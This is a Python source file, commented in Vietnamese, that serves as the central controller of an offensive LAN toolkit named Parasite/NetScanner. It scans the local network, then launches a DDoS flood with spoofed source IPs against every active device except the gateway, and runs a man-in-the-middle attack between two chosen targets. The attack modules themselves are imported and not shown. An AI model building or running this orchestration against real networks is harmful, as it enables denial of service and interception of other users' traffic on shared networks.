# core.py - Lớp quản lý trung tâm cho Parasite

import os
import sys
import time
import threading
import netifaces
import atexit

# Import các module chức năng
from modules.scanner import NetworkScanner
from modules.ddos import DDoSAttacker
from modules.mitm import MitmAttacker

class NetScannerCore:
    """
    Lớp quản lý trung tâm cho NetScanner, điều phối tất cả các module
    """
    def __init__(self):
        # Tạo thư mục logs nếu chưa có
        os.makedirs('logs', exist_ok=True)
        
        # Các thuộc tính cơ bản
        self.target_ip = None
        self.interface = None
        self.attacker_ip = None
        self.gateway_ip = None
        
        # Các module chức năng
        self.scanner = None
        self.ddos_attacker = None
        self.mitm_attacker = None
        
        # Sự kiện dừng
        self.stop_event = threading.Event()
        
        # Các luồng
        self.threads = {}
        
        # Đăng ký hàm dọn dẹp khi thoát
        atexit.register(self.emergency_cleanup)
    
    # Các phương thức tạo module
    def _create_scanner(self):
        """Tạo module scanner"""
        if not self.scanner:
            self.scanner = NetworkScanner()
        return self.scanner
        
    def reset_device_db(self):
        """Xóa cơ sở dữ liệu thiết bị"""
        scanner = self._create_scanner()
        scanner.reset_device_db()
    
    def _create_ddos_attacker(self, targets, port=80, spoof_ip=True):
        """Tạo module DDoS attacker"""
        if not self.attacker_ip:
            # Try to detect network if not already done
            if not self.detect_network():
                print("[-] Không thể xác định IP của máy tấn công. Vui lòng quét mạng trước.")
                return None
        self.ddos_attacker = DDoSAttacker(targets, self.attacker_ip, self.interface, port=port, spoof_ip=spoof_ip)
        return self.ddos_attacker
    
    def start_lan_ddos(self, port=80, spoof_ip=True):
        """Bắt đầu tấn công DDoS vào tất cả các thiết bị 'up' trong mạng."""
        # Đảm bảo có scanner và danh sách thiết bị
        scanner = self._create_scanner()
        if not scanner.devices:
            print("[-] Danh sách thiết bị trống. Vui lòng chạy 'scan' trước.")
            return False
 
        # Lấy tất cả các mục tiêu 'up' từ kết quả quét
        targets = [ip for ip, info in scanner.devices.items() if info.get('status') == 'up']
        
        # Loại trừ gateway (router) khỏi danh sách mục tiêu để tránh làm sập mạng
        if self.gateway_ip in targets:
            print(f"[+] Router/Gateway ({self.gateway_ip}) sẽ được loại trừ khỏi cuộc tấn công.")
            targets.remove(self.gateway_ip)

        if not targets:
            print("[-] Không tìm thấy mục tiêu nào đang hoạt động để tấn công (sau khi loại trừ router và máy của bạn).")
            return False

        # Tạo và bắt đầu attacker
        # Module DDoSAttacker sẽ tự động loại trừ IP của máy tấn công
        if self._create_ddos_attacker(targets, port=port, spoof_ip=spoof_ip):
            self.ddos_attacker.start_attack()
            return True
        return False
    
    def start_mitm(self, target1, target2):
        """Bắt đầu tấn công MitM giữa hai mục tiêu."""
        if not self.detect_network():
            print("[-] Không thể phát hiện mạng. Vui lòng kiểm tra kết nối.")
            return False
        
        # Lớp MitmAttacker sẽ tự quản lý vòng đời của nó
        self.mitm_attacker = MitmAttacker(target1, target2, self.interface)
        self.mitm_attacker.start_attack()
        return True
    
    def detect_network(self):
        """Tự động phát hiện interface và IP của máy tấn công"""
        try:
            gateways = netifaces.gateways()
            default_gateway_info = gateways.get('default', {}).get(netifaces.AF_INET)
            if not default_gateway_info:
                print("[-] Không tìm thấy default gateway. Kiểm tra kết nối mạng.")
                return False
            
            self.gateway_ip = default_gateway_info[0]
            self.interface = default_gateway_info[1]

            # Lấy địa chỉ IP của máy tấn công
            if_addrs = netifaces.ifaddresses(self.interface)
            ipv4_info = if_addrs.get(netifaces.AF_INET)
            if not ipv4_info:
                print(f"[-] Không tìm thấy địa chỉ IPv4 cho interface {self.interface}")
                return False
            
            self.attacker_ip = ipv4_info[0]['addr']
            print(f"[+] Tìm thấy Interface: {self.interface}, IP: {self.attacker_ip}, Gateway: {self.gateway_ip}")
            return True
        except Exception as e:
            print(f"[-] Lỗi khi phát hiện mạng: {e}")
            return False
    
    def scan_network(self, lookup_vendor=False, enhanced_scan=False):
        """Quét mạng để tìm thiết bị"""
        if not self.detect_network():
            print("[-] Không thể phát hiện mạng. Vui lòng kiểm tra kết nối.")
            return None
            
        if enhanced_scan:
            print("\n[*] Quét mạng nâng cao (OS + Services + Security + Latency)...")
        elif lookup_vendor:
            print("\n[*] Quét mạng và phân tích loại thiết bị...")
        else:
            print("\n[*] Quét mạng để cập nhật danh sách thiết bị...")
            
        self.scanner = self._create_scanner()
        result = self.scanner.scan(lookup_vendor, enhanced_scan)
        
        if enhanced_scan:
            print("[+] Quét mạng nâng cao hoàn tất.")
        elif lookup_vendor:
            print("[+] Quét mạng và phân tích loại thiết bị hoàn tất.")
        else:
            print("[+] Quét mạng hoàn tất.")
        return result
    
    def emergency_cleanup(self):
        """Dọn dẹp khi thoát khẩn cấp"""
        print("\n[*] Kích hoạt dọn dẹp khẩn cấp...")
        if self.ddos_attacker:
            self.ddos_attacker.stop_attack()
        
        # MitmAttacker xử lý cleanup riêng qua KeyboardInterrupt,
        # nhưng chúng ta vẫn có thể cố gắng dừng event nếu cần.
        # Việc này phức tạp hơn và cần thiết kế lại luồng chạy.

        self.stop_event.set()
        for thread in self.threads.values():
            if thread.is_alive():
                thread.join(timeout=1)
        print("[+] Dọn dẹp hoàn tất.")
